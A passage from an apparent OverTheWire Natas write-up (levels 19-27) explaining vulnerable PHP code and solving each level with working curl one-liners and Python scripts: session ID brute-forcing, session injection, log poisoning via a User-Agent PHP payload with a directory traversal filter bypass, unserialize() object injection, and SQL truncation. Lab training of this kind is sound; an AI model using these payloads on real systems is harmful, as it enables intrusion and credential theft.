            password_re = re.compile('Password: (?P<password>[a-zA-Z0-9]{32})')
            password = password_re.search(r.text).groupdict()['password']
            return password


if __name__ == '__main__':
    print(find_password())
```

[*Back to top*](#overthewire---natas)

## Level 19

![natas19_index.jpg](screenshots/natas/natas19_index.jpg)

This time, we aren't given the source code. However, we do know that the challenge is similar to the last level. Let's try logging in as `admin` and checking what our session ID is set to:

![natas19_1.jpg](screenshots/natas/natas19_1.jpg)

This looks like a hex encoded string. Let's check:

```bash
$ echo 3335362d61646d696e | xxd -r -p
356-admin
```

Looks like the format is the `<id>-<user>`. We can reuse our script from the last challenge for this.

[Asyncio](files/natas/natas19_asnyc.py)\
[Without Asyncio](files/natas/natas19.py):

```python
#!/usr/bin/env python3
import re
import requests


url = 'http://natas19.natas.labs.overthewire.org/'
auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

def find_password():
    for i in range(1,641):
        cookies = {'PHPSESSID': f'{i}-admin'.encode().hex()}
        r = requests.get(url, auth=auth, cookies=cookies)
        if 'Username: natas20' in r.text:
            password_re = re.compile('Password: (?P<password>[a-zA-Z0-9]{32})')
            password = password_re.search(r.text).groupdict()['password']
            return password


if __name__ == '__main__':
    print(find_password())
```

[*Back to top*](#overthewire---natas)

## Level 20

![natas20_index.jpg](screenshots/natas/natas20_index.jpg)

[Sourcecode](http://natas20.natas.labs.overthewire.org/index-source.html):

```php
<?

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>

<form action="index.php" method="POST">
Your name: <input name="name" value="<?=$name?>"><br>
<input type="submit" value="Change name" />
</form>
```

Another challenge with a lot of code to read through. Once again, we start with our goal and work backwards:

```php
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    }
```

Looks like session hijacking challenge. Let's check for references to the `print_credentials` function:

```php
session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();
```

Alright, so it looks like this challenge uses custom session handlers, which are set with [session_set_save_handler](https://www.php.net/manual/en/function.session-set-save-handler.php). This modifies how the [session_start](https://www.php.net/manual/en/function.session-start.php) function works when it's called.

We need to look into the `myread` function since that is what will be used to check our session ID.

```php
function myread($sid) {
    debug("MYREAD $sid");
    // Make sure SID is alphanumeric or -
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    // Check to see if already session exists
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    // Read session array values from file
    $data = file_get_contents($filename);
    $_SESSION = array();
    // Split by newlines
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    // Split key/value pairs by spaces
    $parts = explode(" ", $line, 2);
    // Set session array values
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}
```

Look's like we've got something interesting here. Apparently it reads the session parameters from a file, which then parses the file line by line and splits the values by spaces using the [explode](https://www.php.net/manual/en/function.explode.php) function.

Next, we do a quick check of the `mywrite` function to make sure there are no curveballs such as input validation.

```php
function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}
```

Looks like we're in the clear. This should be an easy solve. All we have to do is send any random name and add our `admin 1` after a newline character.

We will need to send two requests to get the password. The first to set the session's variables with `mywrite`, then the second to load the page with our newly set session variables.

```bash
curl -s "http://natas20:$natas20_pass@natas20.natas.labs.overthewire.org/" -b PHPSESSID=$(curl -Is "http://natas20:$natas20_pass@natas20.natas.labs.overthewire.org/index.php?name=admin%0aadmin+1" | grep -oP 'PHPSESSID=\K[[:alnum:]-]+(?=;)') | sed "s/$natas20_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 21

![natas21_index.jpg](screenshots/natas/natas21_index.jpg)

[Sourcecode](http://natas21.natas.labs.overthewire.org/index-source.html):

```php
<?

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?>
```

Looks like we have a colocated site, [http://natas21-experimenter.natas.labs.overthewire.org](http://natas21-experimenter.natas.labs.overthewire.org), which shares session cookies with this one. Let's see what's on the other page:

![natas21_experimenter_index.jpg](screenshots/natas/natas21_experimenter_index.jpg)

[Sourcecode](http://natas21-experimenter.natas.labs.overthewire.org/index-source.html):

```php
<?

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>
```

Although it looks like it's filtering for valid keys, if we look at this section here:

```php
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
```

We can see that if `submit` is a parameter, it will just set every key/value pair, regardless of the key. Easy enough. All we have to do is submit a request with `admin=1&submit`.

```bash
curl -s "http://natas21:$natas21_pass@natas21.natas.labs.overthewire.org/" -b PHPSESSID=$(curl -Is "http://natas21:$natas21_pass@natas21-experimenter.natas.labs.overthewire.org/index.php?admin=1&submit" | grep -oP 'PHPSESSID=\K[[:alnum:]-]+(?=;)') | sed "s/$natas21_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 22

![natas22_index.jpg](screenshots/natas/natas22_index.jpg)

[Sourcecode](http://natas22.natas.labs.overthewire.org/index-source.html):

```php
?
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>
...
<?
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>
```

This is an extremely easy challenge. It will reveal the password as long as we have the parameter `revelio` in a GET request. However, if we look at the snippet at the top, if the `revelio` parameter exists, it will redirect us back to the home page. Luckily for us, `curl` doesn't follow redirects by default so we don't have to do anything special to solve this.

```bash
curl -s "http://natas22:$natas22_pass@natas22.natas.labs.overthewire.org/index.php?revelio" | sed "s/$natas22_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 23

![natas23_index.jpg](screenshots/natas/natas23_index.jpg)

[Sourcecode](http://natas23.natas.labs.overthewire.org/index-source.html):

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
```

For this challenge, we have to pass this check to get the password:

```php
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
```

We have to find a way to send a password that equals `iloveyou` but has a value greater than 10. If we look at the documentation for the [strstr](https://www.php.net/manual/en/function.strstr.php) function, we see that it searches a string for the first occurrence of a string. The return value of this function is everything matching the second parameter, `iloveyou` in our case, to the end of the string. This means we can add whatever we want to the beginning of the password and it will be parsed out.

Now, we just need to figure out how to get our input to be greater than 10. If we look at the documentation for [operator comparison](https://www.php.net/manual/en/language.operators.comparison.php), we see this:

> If both operands are numeric strings, or one operand is a number and the other one is a numeric string, then the comparison is done numerically.

And this:

> | Type of Operand 1 | Type of Operand 2 | Result
> |-|-|-|
> |...|...|...|
> | string, resource, int or float | string, resource, int or float | Translate strings and resources to numbers, usual math |

That's... cool. Apparently when php compares a string to integer, it will convert the string to an integer first. Conveniently enough, when you typecast a string to an integer, it parses from left to right and stops at the first non-digit character. All we have to do is prepend an integer that's greater than 10 to `iloveyou`.

```bash
curl -s "http://natas23:$natas23_pass@natas23.natas.labs.overthewire.org/index.php?passwd=11iloveyou" | sed "s/$natas23_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 24

![natas24_index.jpg](screenshots/natas/natas24_index.jpg)

[Sourcecode](http://natas24.natas.labs.overthewire.org/):

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
```

For this challenge, we need to figure out how to get our input to pass this check:

```php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
```

[strcmp](https://www.php.net/manual/en/function.strcmp.php) returns 0 when the two inputs are equal to each other. Unfortunately, there is no way to brute force the password. However, if we read through the [comment section](https://www.php.net/manual/en/function.strcmp.php#108563), we see this:

> If you rely on strcmp for safe string comparisons, both parameters must be strings, the result is otherwise extremely unpredictable.
> ...
> strcmp("foo", array()) => NULL + PHP Warning

Interesting... Apparently, if we compare any string to an array with `strcmp`, it will throw a warning, but still `NULL`. For our purposes, a `NULL` return value is enough to get us past the validation. Luckily for us, since there is no type checking, we can just typecast our parameter as array by sending `passwd[]`.

```bash
curl -s "http://natas24:$natas24_pass@natas24.natas.labs.overthewire.org/index.php?passwd[]" | sed "s/$natas24_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 25

![natas25_index.jpg](screenshots/natas/natas25_index.jpg)

[Sourcecode](http://natas25.natas.labs.overthewire.org/index-source.html):

```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en");
    }

    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) {
            include($filename);
            return 1;
        }
        return 0;
    }

    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;

        closedir($handle);
        return $listoffiles;
    }

    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n";
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php
    session_start();
    setLanguage();

    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
```

Alright, once again, we start at our goal and work backwards. However, this time, it isn't so easy to identify where our goal is. Unlike the past challenges, there isn't anything here that prints the password for us. Let's try a different approach: looking for any parameters we have control over, and how they are handled.

Every time the page is loaded, it runs this function:

```php
    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en");
    }
```

It looks like this function will include any file we send in the `lang` parameter. Unfortunately, it's not that simple. It's using this function to include files:

```php
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) {
            include($filename);
            return 1;
        }
        return 0;
    }
```

Before it includes a file, it first checks if a directory traversal or `natas_webpass` is in our request. Looks like were out of luck here.

Let's keep looking through the source code for more things we have control over:

```php
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n";
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```

Interesting... If we look back at the `safeinclude` function, we see it logs directory traversal and `natas_webpass` attempts using the `logRequest` function. The `logRequest` then logs our `HTTP_USER_AGENT` string in a file named `natas25_<session_id>.log` in the `/var/www/natas/natas25/logs/` directory. Luckily for us, that filename does not have `natas_webpass` in it. What's even better is when a file is included with `include`, it will interpret any php code in the file. It looks like we can inject some code in our user agent string.

However, we're not out of the woods yet. If we take another look at the `setLanguage` function, it prepends `language/` to any file we try to read. Based on the log file's save path, we can assume the web page's root directory is `/var/www/natas/natas25/`. We need to somehow do a directory traversal from `/var/www/natas/natas25/language` to `/var/www/natas/natas25/logs`. Let's take a closer look at how the directory traversal check works:

```php
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
```

If it sees the string `../` in our filename, it deletes all instances of `../`. Hang on a second... It only does this once, then continues with the rest of the function. Looks like we've found a vulnerability. Since it is only searching and replacing the string `../`, we can send something like `....//`, which only has one occurrence of `../`. However, when `../` is replaced, we are left with `../`.

Looks like we've got all the pieces of the puzzle for our exploit. We have to:

1. Set our user agent string to something to read the password with.
2. Trigger a `logRequest` call.
3. Read the log by doing a directory traversal.

Since there doesn't seem to be any validation of the session id, we do all of this in one request by setting our own session id value.

```bash
PHPSESSID=$(cat /dev/urandom | tr -cd [:alnum:] | head -c16); curl -s "http://natas25:$natas25_pass@natas25.natas.labs.overthewire.org/index.php" -b "PHPSESSID=$PHPSESSID" --data-urlencode "lang=/....//logs/natas25_$PHPSESSID.log" -A '<?php readfile("/etc/natas_webpass/natas26")?>' | sed "s/$natas25_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 26

![natas26_index.jpg](screenshots/natas/natas26_index.jpg)

[Sourcecode](http://natas26.natas.labs.overthewire.org/):

```php
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);

                    }
        }
    }

    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>
```

Alright, so let's dig in. While quickly skimming the code, I don't really see anything interesting happening with the `x1`, `y1`, `x2`, or `y2` variables. It doesn't seem to be used in any way that can be exploited, so we can ignore that for now. I also notice the `Logger` class is defined, but never used in the code. Strange... I wonder why that is.

Let's keep digging to see if there is anything else interesting. After looking through the source code, we notice this:

```php
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
```

Looks like we've found the vulnerability. If we look at the documentation for the [unserialize](https://www.php.net/manual/en/function.unserialize) function, we see a big fat warning message saying:

> **Warning** Do not pass untrusted user input to unserialize() regardless of the options value of allowed_classes. Unserialization can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this.

That happens to be our exact scenario. We have complete control over what gets passed to the `unserialize` function through our cookie. Now we just have to figure out what to pass it. Hmm... Let's take another look at the mysterious `Logger` class from earlier:

```php
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }
```

Interesting. It looks like a `Logger` object will write information to a file when it's created and deleted. Luckily for us, the `unserialize` function occurs within the `drawFromUserData` function. This means if we pass it a `Logger` object, it will be deleted when `drawFromUserData` is done running, which will then run the `__destruct` function, thus logging the `exitMsg` in `logFile`. Great, now we just have to create a serialized `Logger` object:

```php
<?php
class Logger{
    private $exitMsg="<?php readfile('/etc/natas_webpass/natas27')?>";
    private $logFile="img/random_filename.php";
}
echo base64_encode(serialize(new Logger()));
?>
```

Now we pass that to the site and read the file:

```bash
filename=$(cat /dev/urandom | tr -cd [:alnum:] | head -c16); curl -s "http://natas26:$natas26_pass@natas26.natas.labs.overthewire.org/" -b drawing=$(php -r 'class Logger{private $exitMsg="<?php readfile('"'/etc/natas_webpass/natas27'"')?>";private $logFile="img/'$filename'.php";}echo urlencode(base64_encode(serialize(new Logger())));') -o /dev/null; curl -s "http://natas26:$natas26_pass@natas26.natas.labs.overthewire.org/img/$filename.php"
```

[*Back to top*](#overthewire---natas)

## Level 27

![natas27_index.jpg](screenshots/natas/natas27_index.jpg)

[Sourcecode](http://natas27.natas.labs.overthewire.org/index-source.html):

```php
<?

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){

    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysql_query($query, $link);
    if(mysql_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){

    $user=mysql_real_escape_string($usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){

    $user=mysql_real_escape_string($usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            while ($row = mysql_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysql_query($query, $link);
    if(mysql_affected_rows() > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas27', '<censored>');
    mysql_select_db('natas27', $link);


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<? } ?>
```

We have another SQL challenge. However, this time, it seems like every query uses [mysql_real_escape_string](https://www.php.net/manual/en/function.mysql-real-escape-string.php), which means SQLi is out of the question.

While looking through the source code, one function jumps out at me:

```php
function dumpData($link,$usr){

    $user=mysql_real_escape_string($usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            while ($row = mysql_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}
```

Obviously, this is the function we need to use to retreive the password. But how do we get this to print the password for `natas28`? Without SQLi, we are going to need valid user credentials. We don't have any way to change the password for `natas28`, and even if we could, that would be counterproductive. So the next logical option is to create a duplicate user for `natas28`. But is that even possible?

If we take another look at the source code, we see this snippet:

```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```

I wonder what happens when we try to create a username longer than 64? Let's try making a user named `ReallyLongUsernameThatIsLongerThanTheMaximumCharacterLimitOfSixtyFour`.

![natas27_1.jpg](screenshots/natas/natas27_1.jpg)

Now let's try logging in to it.

![natas27_2.jpg](screenshots/natas/natas27_2.jpg)

Strange... But not unexpected. Let's think about why this happened. What most likely happened here is when we attempted to create the user `ReallyLongUsernameThatIsLongerThanTheMaximumCharacterLimitOfSixtyFour`, the name was truncated to 64 characters. When we attempted to log in with that user, the `validUser` function checks for the full name, whereas what's actually stored in the database is only the first 64 characters. This is why it creates another user with the same username. We can test this by attempting to log in with the user `ReallyLongUsernameThatIsLongerThanTheMaximumCharacterLimitOfSixt`, which is the first 64 characters of the username.

![natas27_3.jpg](screenshots/natas/natas27_3.jpg)

Success!

If we take it one step further, we can repeat this process, but use different passwords for each instance. We should still be able to dump the user credentials for the first instance we created using the password from the second instance.

Great. Now we've figured out how to create duplicate users, but how do we duplicate `natas28`? We can't just use filler characters to pad it... Or can we?

Obviously, we won't be able to use some random character because `natas28` and `natas28AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` are two completely different usernames. But what if we use whitespace? Let's try creating a user with `natas28` and 58 or more spaces.

![natas27_4.jpg](screenshots/natas/natas27_4.jpg)

It's not what we wanted, but it's progress. It looks like the two strings still match, despite having extra spaces. What if we add a non-whitespace character at the end?

![natas27_5.jpg](screenshots/natas/natas27_5.jpg)

It worked! The extra character was truncated because it past the 64 character limit, leaving us with a new user named `natas28`.

```bash
curl -s "http://natas27:$natas27_pass@natas27.natas.labs.overthewire.org/" --data-urlencode "username=natas28                                                         ." -d "password=password" >/dev/null; curl -s "http://natas27:$natas27_pass@natas27.natas.labs.overthewire.org/index.php?username=natas28&password=password" | sed "s/$natas27_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)
